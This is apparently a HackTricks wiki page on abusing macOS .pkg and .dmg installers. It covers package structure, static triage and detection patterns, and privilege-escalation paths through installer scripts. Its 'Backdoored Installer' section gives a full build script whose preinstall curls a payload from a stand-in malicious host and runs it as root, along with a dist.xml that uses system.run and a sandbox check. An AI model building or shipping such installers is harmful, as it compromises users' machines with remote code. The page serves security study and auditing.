# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.

The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
- **Payload (CPIO archive gzip compressed)**: Files to install in the `install-location` from PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.

### Decompress

```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```

In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

If the goal is analysis, try to **avoid opening the package with `Installer.app` first**. Some packages can execute code as soon as Installer opens them (for example via `system.run()` or installer plug-ins), so offline extraction is usually the safer starting point.

```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```

## DMG Basic Information

DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.

> [!CAUTION]
> Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:

- Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
  - Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
  - Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.

## Privesc via pkg abuse

### Execution from public directories

If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and an attacker can control that script, they can escalate privileges whenever it's executed. Or another similar example:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.

```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```

For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Modern PackageKit bugs showed that installer scripts are often executed as **trusted root code** while still keeping attacker-controlled context nearby. When auditing vendor packages, pay special attention to:

- Shell interpreters such as `#!/bin/zsh` / `#!/bin/bash`
- Calls like `sudo -u $USER`, `launchctl asuser`, or any logic that trusts `$USER`, `$HOME`, `PATH`, `TMPDIR`, or relative paths
- Non-shell interpreters that may load user-controlled init files or libraries

```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```

For the 2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs), check [the generic macOS privesc page](../macos-privilege-escalation.md). If the package is **Apple-signed**, the same script bug can become **SIP/TCC-relevant** because `system_installd` may carry `com.apple.rootless.install.heritable`; see [the SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

If an installer writes to `/tmp/fixedname/bla/bla`, it's possible to **create a mount** over `/tmp/fixedname` with noowners so you could **modify any file during the installation** to abuse the installation process.

An example of this is **CVE-2021-26089** which managed to **overwrite a periodic script** to get execution as root. For more information take a look at the talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

It's possible to just generate a **`.pkg`** file with **pre and post-install scripts** without any real payload apart from the malware inside the scripts.

### JS in Distribution xml

It's possible to add **`<script>`** tags in the **distribution xml** file of the package and that code will get executed and it can **execute commands** using **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

In distribution packages this usually depends on the top-level `Distribution` file enabling external scripts, for example with `allow-external-scripts="true"`. Therefore reviewing only `preinstall` / `postinstall` is not enough: the **Distribution XML itself** can contain `installation-check` / `volume-check` hooks and direct `system.run()` / `system.runOnce()` execution paths.

```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```

### Backdoored Installer

Malicious installer using a script and JS code inside dist.xml

```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
    <title>Malicious Installer</title>
    <options allow-external-scripts="true" customize="allow" require-scripts="true"/>
    <script>
        <![CDATA[
        function installationCheck() {
            if (system.isSandboxed()) {
                my.result.title = "Cannot install in a sandbox.";
                my.result.message = "Please run this installer outside of a sandbox.";
                return false;
            }
            return true;
        }
        function volumeCheck() {
            return true;
        }
        function preflight() {
            system.run("/path/to/preinstall");
        }
        function postflight() {
            system.run("/path/to/postinstall");
        }
        ]]>
    </script>
    <choices-outline>
        <line choice="default">
            <line choice="myapp"/>
        </line>
    </choices-outline>
    <choice id="myapp" title="MyApp">
        <pkg-ref id="com.malicious.myapp"/>
    </choice>
    <pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```

## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}



